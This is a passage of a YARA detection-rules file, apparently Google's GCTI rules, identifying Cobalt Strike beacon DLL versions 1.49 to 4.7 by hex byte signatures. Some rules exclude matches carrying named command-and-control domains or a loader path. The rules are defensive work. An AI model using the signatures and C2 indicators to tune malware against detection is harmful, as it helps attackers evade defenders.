		$decode = { B1 ?? 30 88 [4] 40 3D A8 01 00 00 7C F2 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V1_49
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Version 1.49"
		author = "gssincla@google.com"
		id = "871e28c9-b580-5a32-8529-2290ded1a1b6"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L180-L211"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "52b4bd87e21ee0cbaaa0fc007fd3f894c5fc2c4bae5cbc2a37188de3c2c465fe"
		logic_hash = "935232d5ddccdc0401b4d911cdc73a48305347b495219c8c893615fe918f32f1"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 48 56 83 F8 1E 0F 87 23 01 00 00 FF 24 }
		$decoder = { B1 ?? 90 30 88 [4] 40 3D A8 01 00 00 7C F2 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V2_0_49
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Version 2.0.49"
		author = "gssincla@google.com"
		id = "087c584a-5ceb-536a-8842-53fbd668df54"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L213-L243"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "ed08c1a21906e313f619adaa0a6e5eb8120cddd17d0084a30ada306f2aca3a4e"
		logic_hash = "3616579dabcfd0ba413d17b4fbd0da5313b9beca94f7bf8e41f05d6679b4a215"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 83 F8 22 0F 87 96 01 00 00 FF 24 }
		$decoder = { B1 ?? EB 03 8D 49 00 30 88 [4] 40 3D 30 05 00 00 72 F2  }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V2_1_And_V2_2
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Versions 2.1 and 2.2"
		author = "gssincla@google.com"
		id = "384fb247-aae7-52e1-a45d-6bda0f80a04e"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L245-L276"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "ae7a1d12e98b8c9090abe19bcaddbde8db7b119c73f7b40e76cdebb2610afdc2"
		logic_hash = "eee3702d6fde08b8e9f5533f903fa33fb3da808a3b76ca43e4d5029f9ce91ad0"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 49 56 57 83 F9 24 0F 87 8A 01 00 00 FF 24 }
		$decoder = { 80 B0 [4] ?? 40 3D 10 06 00 00 72 F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V2_3
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Versions 2.3"
		author = "gssincla@google.com"
		id = "aed092f1-fbb1-5efe-be8d-fb7c5aba1cde"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L278-L308"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "00dd982cb9b37f6effb1a5a057b6571e533aac5e9e9ee39a399bb3637775ff83"
		logic_hash = "286d7ffa83634b82160788abaf1c5b319a09c4a1243af2401799f327be76ad75"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 49 56 57 83 F9 26 0F 87 A9 01 00 00 FF 24 }
		$decoder = { 80 B0 [4] ?? 40 3D 10 06 00 00 72 F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V2_4
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Versions 2.4"
		author = "gssincla@google.com"
		id = "347a6b06-84a8-53ff-80a1-05fa1a48a412"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L310-L340"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "78c6f3f2b80e6140c4038e9c2bcd523a1b205d27187e37dc039ede4cf560beed"
		logic_hash = "087ec6f585e90b84c00e746beb37cb8365cb7b4d07ebd0c48e3ba3d5df94dba2"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 4A 56 57 83 FA 2F 0F 87 F9 01 00 00 FF 24 }
		$decoder = { 80 B0 [4] ?? 40 3D 10 06 00 00 72 F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V2_5
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Versions 2.5"
		author = "gssincla@google.com"
		id = "a89f9239-099c-5b97-b1df-e8ce2b95ea52"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L342-L372"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "d99693e3e521f42d19824955bef0cefb79b3a9dbf30f0d832180577674ee2b58"
		logic_hash = "f2d0ca1414a60bf855543d99777ae5e83c451db41aba5e255e4c10b1e0bb7b47"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 48 57 8B F2 83 F8 3A 0F 87 6E 02 00 00 FF 24 }
		$decoder = { 80 B0 [4] ?? 40 3D 10 06 00 00 72 F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V3_0
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Versions 3.0"
		author = "gssincla@google.com"
		id = "132a1be8-f529-5141-ba03-fdf6df3d55d4"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L374-L404"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "30251f22df7f1be8bc75390a2f208b7514647835f07593f25e470342fd2e3f52"
		logic_hash = "951f1b52c14010261022f9f920d53d3c1e88f41461798a23e72083c981f9de76"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 48 57 8B F2 83 F8 3C 0F 87 89 02 00 00 FF 24 }
		$decoder = { 80 B0 [4] ?? 40 3D 10 06 00 00 72 F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V3_1
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Versions 3.1"
		author = "gssincla@google.com"
		id = "aa511dee-69ea-53bd-be90-d2d03d08c550"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L406-L461"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "4de723e784ef4e1633bbbd65e7665adcfb03dd75505b2f17d358d5a40b7f35cf"
		logic_hash = "2d91add3aefe69b4525f93f7ea9f2fcbd7a6c506a224997ff73a2eeef63a8cd4"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 55 8B EC 83 EC 58 A1 [4] 33 C5 89 45 FC E8 DF F5 FF FF 6A 50 8D 45 A8 50 FF 15 [4] 8D 45 ?? 50 FF 15 [4] 85 C0 74 14 8B 40 0C 83 38 00 74 0C 8B 00 FF 30 FF 15 [4] EB 05 B8 [4] 8B 4D FC 33 CD E8 82 B7 00 00 C9 }
		$decoder = { 80 B0 [4] ?? 40 3D 10 06 00 00 72 F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V3_2
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Versions 3.2"
		author = "gssincla@google.com"
		id = "3ccbc0f2-241c-5c10-8930-4a3d264d3b57"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L463-L528"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "b490eeb95d150530b8e155da5d7ef778543836a03cb5c27767f1ae4265449a8d"
		logic_hash = "e1fe0d58d86ad8c845d65608314007ce08e3e524fb92cdb33ddae860c640e3e9"
		score = 75
		quality = 85
		tags = ""
		rs2 = "a93647c373f16d61c38ba6382901f468247f12ba8cbe56663abb2a11ff2a5144"

	strings:
		$version_sig = { 48 57 8B F2 83 F8 3D 0F 87 83 02 00 00 FF 24 }
		$decoder = { 80 B0 [4] ?? 40 3D 10 06 00 00 72 F1 }
		$version3_1_sig = { 55 8B EC 83 EC 58 A1 [4] 33 C5 89 45 FC E8 DF F5 FF FF 6A 50 8D 45 A8 50 FF 15 [4] 8D 45 ?? 50 FF 15 [4] 85 C0 74 14 8B 40 0C 83 38 00 74 0C 8B 00 FF 30 FF 15 [4] EB 05 B8 [4] 8B 4D FC 33 CD E8 82 B7 00 00 C9 }

	condition:
		$version_sig and $decoder and not $version3_1_sig
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V3_3
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Versions 3.3"
		author = "gssincla@google.com"
		id = "7cce26c9-1403-535f-bd9d-19667c7e313c"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L530-L560"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "158dba14099f847816e2fc22f254c60e09ac999b6c6e2ba6f90c6dd6d937bc42"
		logic_hash = "f9b9b669aacc156a4e07eab0c6a638f9b9d828e018d1db89e9e2c922641744ac"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 48 57 8B F1 83 F8 41 0F 87 F0 02 00 00 FF 24 }
		$decoder = { 80 B0 [4] ?? 40 3D 10 06 00 00 72 F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V3_4
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Versions 3.4"
		author = "gssincla@google.com"
		id = "58a34ab6-c061-59a2-b929-8519d3d844e7"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L562-L592"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "5c40bfa04a957d68a095dd33431df883e3a075f5b7dea3e0be9834ce6d92daa3"
		logic_hash = "f3372bc538092e30c62d9599f76f2115dc73faf7a5fd6f86c8d4cfaa35473810"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 48 57 8B F1 83 F8 42 0F 87 F0 02 00 00 FF 24 }
		$decoder = { 80 B0 [4] ?? 40 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V3_5_Hf1_And_3_5_1
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Versions 3.5-hf1 and 3.5.1 (3.5.x)"
		author = "gssincla@google.com"
		id = "1532596e-be0e-58c2-8d3b-5120c793d677"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L594-L625"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "c78e70cd74f4acda7d1d0bd85854ccacec79983565425e98c16a9871f1950525"
		logic_hash = "c2e975678815638803b04261d46bca216bc0b2f894a1f72fd0d5b949493401d1"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 48 57 8B F1 83 F8 43 0F 87 07 03 00 00 FF 24 }
		$decoder = { 80 B0 [4] ?? 40 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V3_6
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Versions 3.6"
		author = "gssincla@google.com"
		id = "7e7b5c22-82b3-5298-b794-b06d94a668d5"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L627-L657"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "495a744d0a0b5f08479c53739d08bfbd1f3b9818d8a9cbc75e71fcda6c30207d"
		logic_hash = "3bd3f0b8625e131726fa92d68de041dae6c3d5642cbf22ac596d1d82da1d4a07"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 48 57 8B F9 83 F8 47 0F 87 2F 03 00 00 FF 24 }
		$decoder = { 80 B0 [4] ?? 40 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V3_7
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Versions 3.7"
		author = "gssincla@google.com"
		id = "6352a31c-34b8-5886-8e34-ef9221c22e6e"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L659-L689"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "f18029e6b12158fb3993f4951dab2dc6e645bb805ae515d205a53a1ef41ca9b2"
		logic_hash = "6ceb2cec8402a4679bad42d367156c74e897af4188442fdebc70d6ce2dd78bd6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 48 57 8B F9 83 F8 49 0F 87 47 03 00 00 FF 24 }
		$decoder = { 80 B0 [4] ?? 40 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V3_8
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Versions 3.8"
		author = "gssincla@google.com"
		id = "f76712a4-df1c-5e6b-b5ac-9c74f2e202fc"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L691-L731"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "67b6557f614af118a4c409c992c0d9a0cc800025f77861ecf1f3bbc7c293d603"
		logic_hash = "a0c78dd7cda055bc76a8661b0416a302d7b05d03eeea483d2d1695093cd6dc90"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 48 57 8B F9 83 F8 4B 0F 87 5D 03 00 00 FF 24 }
		$decoder = { 80 B0 [4] ?? 40 3D 00 10 00 00 7C F1 }
		$xmrig_srcpath = "C:/Users/SKOL-NOTE/Desktop/Loader/script.go"
		$c2_1 = "ns7.softline.top" xor
		$c2_2 = "ns8.softline.top" xor
		$c2_3 = "ns9.softline.top" xor

	condition:
		$version_sig and $decoder and not ( 2 of ( $c2_* ) or $xmrig_srcpath )
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V3_11
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Versions 3.11"
		author = "gssincla@google.com"
		id = "00e42396-db81-5d43-90ee-5a97b379019e"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L739-L770"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "2428b93464585229fd234677627431cae09cfaeb1362fe4f648b8bee59d68f29"
		logic_hash = "24ca0a9c2249d1872a53dc228234bdc6803bdfe9e80847995e0951184a8d935c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 48 57 8B FA 83 F8 50 0F 87 11 03 00 00 FF 24 }
		$decoder = { 80 B0 [4] ?? 40 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V3_11_Bugfix_And_V3_12
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Versions 3.11-bugfix and 3.12"
		author = "gssincla@google.com"
		id = "08ff2a2f-97bd-5839-b414-d67fbf2cdb0f"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L772-L804"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "5912c96fffeabb2c5c5cdd4387cfbfafad5f2e995f310ace76ca3643b866e3aa"
		logic_hash = "566eb14f918ad422d5a273390263e63ac37b00cd10ac3561e038fb1a27f85d80"
		score = 75
		quality = 85
		tags = ""
		rs2 = "4476a93abe48b7481c7b13dc912090b9476a2cdf46a1c4287b253098e3523192"

	strings:
		$version_sig = { 48 57 8B FA 83 F8 50 0F 87 0D 03 00 00 FF 24 }
		$decoder = { 80 B0 [4] ?? 40 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V3_13
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Versions 3.13"
		author = "gssincla@google.com"
		id = "98dd32e6-9bb5-57b2-a5e5-1c74a0d1e6d3"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L806-L836"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "362119e3bce42e91cba662ea80f1a7957a5c2b1e92075a28352542f31ac46a0c"
		logic_hash = "adafac8692ad676b0168b3e829bc7948db72953b95c79d483ae1a05f1d4f9b2b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 4A 56 57 83 FA 5A 0F 87 2D 03 00 00 FF 24 }
		$decoder = { 80 B0 [4] ?? 40 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V3_14
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Versions 3.14"
		author = "gssincla@google.com"
		id = "00edfc72-c7b8-5100-8275-ae3548b96e49"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L838-L866"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "254c68a92a7108e8c411c7b5b87a2f14654cd9f1324b344f036f6d3b6c7accda"
		logic_hash = "6faed2b69647b87d86d46ae73ad92cfe7b2746c306cd7480dc9f0c484c8882e2"
		score = 75
		quality = 85
		tags = ""
		rs2 = "87b3eb55a346b52fb42b140c03ac93fc82f5a7f80697801d3f05aea1ad236730"

	strings:
		$version_sig = { 83 FA 5B 77 15 FF 24 }
		$decoder = { 80 B0 [4] ?? 40 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Sleeve_Beacon_Dll_V4_0_Suspected
{
	meta:
		description = "Cobalt Strike's sleeve/beacon.dll Versions 4.0 (suspected, not confirmed)"
		author = "gssincla@google.com"
		id = "50ff6e44-ebc0-5000-a816-b385a6675768"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L868-L901"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "e2b2b72454776531bbc6a4a5dd579404250901557f887a6bccaee287ac71b248"
		logic_hash = "6875099bc6df26f829f9f64e70bd7fdac6ac7b83a5596fc9359c127fef4e6db5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 51 4A 56 57 83 FA 62 0F 87 8F 03 00 00 FF 24 95 56 7B 00 10 }
		$decoder = { 80 B0 [4] ?? 40 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Sleeve_Beacon_Dll_V4_1_And_V4_2
{
	meta:
		description = "Cobalt Strike's sleeve/beacon.dll Versions 4.1 and 4.2"
		author = "gssincla@google.com"
		id = "793df916-bdf7-5743-b008-0113caf38bae"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L903-L934"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "daa42f4380cccf8729129768f3588bb98e4833b0c40ad0620bb575b5674d5fc3"
		logic_hash = "7280a5c3f478ea40b6b72fb4669d5b8c21603e7fbfbc3815a83bc462ee19c0f5"
		score = 75
		quality = 85
		tags = ""
		rs2 = "9de55f27224a4ddb6b2643224a5da9478999c7b2dea3a3d6b3e1808148012bcf"

	strings:
		$version_sig = { 48 57 8B F2 83 F8 63 0F 87 3C 03 00 00 FF 24 }
		$decoder = { 80 B0 [4] ?? 40 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Sleeve_Beacon_Dll_V4_3_V4_4_V4_5_And_V4_6
{
	meta:
		description = "Cobalt Strike's sleeve/beacon.dll Versions 4.3 and 4.4"
		author = "gssincla@google.com"
		id = "976e087c-f371-5fc6-85f8-9c803a91f549"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L936-L967"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "51490c01c72c821f476727c26fbbc85bdbc41464f95b28cdc577e5701790845f"
		logic_hash = "6608a84c4fd3bf77fd5b426da8be250d8b99878bd746fa23789f4791a164ce33"
		score = 75
		quality = 85
		tags = ""
		rs2 = "78a6fbefa677eeee29d1af4a294ee57319221b329a2fe254442f5708858b37dc"

	strings:
		$version_sig = { 48 57 8B F2 83 F8 65 0F 87 47 03 00 00 FF 24 }
		$decoder = { 80 B0 [4] ?? 40 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Sleeve_Beacon_Dll_V4_7_Suspected
{
	meta:
		description = "Cobalt Strike's sleeve/beacon.dll Versions 4.7 (suspected, not confirmed)"
		author = "gssincla@google.com"
		id = "4b6f90dd-69f3-5555-9195-6a0aed0fff58"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L969-L1002"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "da9e91b3d8df3d53425dd298778782be3bdcda40037bd5c92928395153160549"
		logic_hash = "297ff7c3acfe6f9676dc6c265c548f017f39ccc5217617344e3bccc704ac4c78"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 53 56 48 57 8B F2 83 F8 67 0F 87 5E 03 00 00  }
		$decoder = { 80 B0 [4] ?? 40 3D 00 10 00 00 7C F1 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_X64_V3_2
{
	meta:
		description = "Cobalt Strike's sleeve/beacon.x64.dll Versions 3.2"
		author = "gssincla@google.com"
		id = "61188243-0b90-5bff-bcc8-50f10ed941f6"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L1029-L1068"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "5993a027f301f37f3236551e6ded520e96872723a91042bfc54775dcb34c94a1"
		logic_hash = "3803aaac537aec0b188870177e510a3789a71c19be576569b59aa146b2ba62c5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 4C 8D 05 9F F8 FF FF 8B D3 48 8B CF E8 05 1A 00 00
